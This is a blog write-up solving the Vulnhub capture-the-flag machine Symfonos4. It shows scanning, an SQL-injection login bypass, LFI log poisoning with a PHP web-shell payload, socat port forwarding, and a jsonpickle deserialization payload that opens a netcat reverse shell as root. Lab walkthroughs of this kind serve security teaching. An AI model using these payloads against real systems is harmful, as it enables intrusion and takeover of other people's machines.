---
layout: post
title: "Vulnhub - Symfonos4"
mathjax: true

date: 2021-10-25
---

*LFI vulnerability lead to reverse shell on the target machine and an Insecure deserialization vulnerability in python's jsonpickle module lead to privilege escalation*
<!--more-->


## **Description**

Name: symfonos: 4

Difficulty: Intermediate

Tested: VirtualBox

DHCP Enabled

## **Details**

Machine Link: https://www.vulnhub.com/entry/symfonos-4,347/

Category:    Web Application | Boot2Root

## **Solution**

### Discovering Device
After importing and starting the virtual machine, first we run **netdiscover** to identify devices on our network.

<img src="/resources/2021/symfonos4/1.png" width="800">

One of the devices is our target machine and the other one is a mobile device running a wifi hotspot.

### Nmap Port Scan
To identify our target device, we run **nmap** port scan to identify the target machine.

```
┌──(john㉿kalilinux)-[~]
└─$ sudo nmap -sV -O -A 192.168.90.59
```

<img src="/resources/2021/symfonos4/2.png" width="800">

```
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.9p1 Debian 10 (protocol 2.0)
80/tcp open http Apache httpd 2.4.38 ((Debian))
MAC Address: 08:00:27:BC:DA:76 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT ADDRESS
1 0.62 ms 192.168.90.59
```

We have successfully identified that this is the target device. Furthermore, it is running an apache web server on port 80 and a ssh server on port 22.

### Web Server Vulnerability Scan
First we use **nikto** to initiate a web server vulnerability scan.

```
┌──(john㉿kalilinux)-[~]
└─$ nikto -host http://192.168.90.59/
```

<img src="/resources/2021/symfonos4/3.png" width="800">

```
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Cookie PHPSESSID created without the httponly flag
+ Entry '/atlantis.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Server may leak inodes via ETags, header found with file /, inode: c9, size: 59058b74c9871, mtime: gzip
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7916 requests: 0 error(s) and 12 item(s) reported on remote host
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
```

Nikto has not given us any interesting vulnerability.

### Enumerating Web Server
Now, we enumerate web directories and files using **gobuster**

```
┌──(john㉿kalilinux)-[~]
└─$ gobuster dir --url http://192.168.90.59/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -q
```

<img src="/resources/2021/symfonos4/4.png" width="800">

We have identified a directory named `gods`. Let's take a look at the contents,

<img src="/resources/2021/symfonos4/5.png" width="800">

Let's take a look at hades.log.

<img src="/resources/2021/symfonos4/6.png" width="800">

These files contain no interesting content. We can see another file `/atlantis.php` and upon visiting this file, we have found a login panel.

<img src="/resources/2021/symfonos4/7.png" width="800">

We have found ourselves a login panel.

### Bypassing Login
After trying out different sql injections, this login panel was successfully bypassed by using a sql injection.

<img src="/resources/2021/symfonos4/8.png" width="800">

After logging in, web server redirects us to ‘/sea.php’ web file

<img src="/resources/2021/symfonos4/9.png" width="800">

If we select a god, we can see that it displays the content from the ‘/gods/’ directory that we found out earlier.   

<img src="/resources/2021/symfonos4/10.png" width="800">

By looking at the url, we can see that it is accessing the log file from the `/gods` directory. This gives us a solid hint that this web server is vulnerable to Local File Intrusion (**LFI**) vulnerability.

<img src="/resources/2021/symfonos4/11.png" width="800">

### LFI Exploitation
Moving forward, we can use LFI to read system files and try to find our way into the target machine. Since the url is reading *.log files, first we try to read different log files and `/var/log/auth.log` is readable. Let us try logging in via ssh with an invalid user bot

<img src="/resources/2021/symfonos4/12.png" width="800">

We can see that it was logged in this file. By knowing this, we can try the following payload to be able to run commands on the target machine.

```
┌──(john㉿kalilinux)-[~]
└─$ ssh ‘<? php system($_GET[’cmd']);?>'@192.168.18.27
```

This exploit basically includes malicious code in the logs file. We can then use the `cmd` parameter to execute custom commands. We can confirm this by running the `ls` command as shown below.

<img src="/resources/2021/symfonos4/13.png" width="800">

<img src="/resources/2021/symfonos4/14.png" width="800">

Now, we can use this to get a reverse shell on our machine. Netcat does not seem to work on the target machine due to some reason, so now, we will upload a php reverse shell to the target machine. We will use python web server to download the php reverse on the target machine `/tmp` directory.

<img src="/resources/2021/symfonos4/15.png" width="800">

<img src="/resources/2021/symfonos4/16.png" width="800">

Now, we will setup a netcat listener on our machine and execute our payload on target machine

<img src="/resources/2021/symfonos4/17.png" width="800">

We have successfully gotten a reverse shell on the target machine

<img src="/resources/2021/symfonos4/18.png" width="800">

Now, we will stabilize our shell using python. 

<img src="/resources/2021/symfonos4/19.png" width="800">

<img src="/resources/2021/symfonos4/20.png" width="800">

### Privilege Escalation
First we will use this one liner to download **linux smart enumeration** script on `/tmp` directory. 

```
wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh;chmod 700 lse.sh
```

Running linux smart enumeration script on our target machine tells us that there is **hidden web server** and mysql server running on target machine which can only be accessed from the inside     

<img src="/resources/2021/symfonos4/21.png" width="800">

We will use **socat** to forward port 8080 on port 4444 since it was already installed on the target machine

```
socat TCP-LISTEN:4444,fork,reuseaddr tcp:127.0.0.1:8080 &
```

Now, we can successfully access this hidden web server on port 4444

<img src="/resources/2021/symfonos4/22.png" width="800">

Main page doesn't tell us anything important, but if we see the cookie in the network tab of our browser, we can see some interesting details.   

```
Cookie: PHPSESSID=r14sp8fvvk614cptufe8abmv8g; username=eyJweS9vYmplY3QiOiAiYXBwLlVzZXIiLCAidXNlcm5hbWUiOiAiUG9zZWlkb24ifQ==
```

We can see that username is base64 encoded, decoding it gives us   

<img src="/resources/2021/symfonos4/23.png" width="800">

This tells us that there is a python flask server running with the user “Poseidon”. We will now try to find the `app.py` to look at the source code.  

<img src="/resources/2021/symfonos4/24.png" width="800">

The app is present in the `/opt/code` directory. After looking at the source code, we can see that it is importing some libraries and most importantly in our case `jsonpickle`

<img src="/resources/2021/symfonos4/25.png" width="800">

A simple `searchsploit jsonpickle` tells us about an **insecure deserialization** RCE vulnerability

<img src="/resources/2021/symfonos4/26.png" width="800">

We can give custom commands to the cookie that was being set earlier and have ourselves an RCE on the machine. A simple google search on jsonpickle exploit gives us the following shell code which is just using python os module to execute netcat command with uid 0 which is of root.   

```
{"py/object": "__main__.Shell", "py/reduce": [{"py/function": "os.system"}, ["/usr/bin/nc -e /bin/bash 192.168.18.25 6666"], 0, 0, 0]}
```

After base64 encoding it,

<img src="/resources/2021/symfonos4/27.png" width="800">

Now, we will again send a request to the server using `curl` using our spoofed cookie and start a netcat listener on our machine.

<img src="/resources/2021/symfonos4/28.png" width="800">

We have successfully gotten a reverse shell on the target machine with root user

<img src="/resources/2021/symfonos4/29.png" width="800">

### Capturing the Flag

<img src="/resources/2021/symfonos4/30.png" width="800">

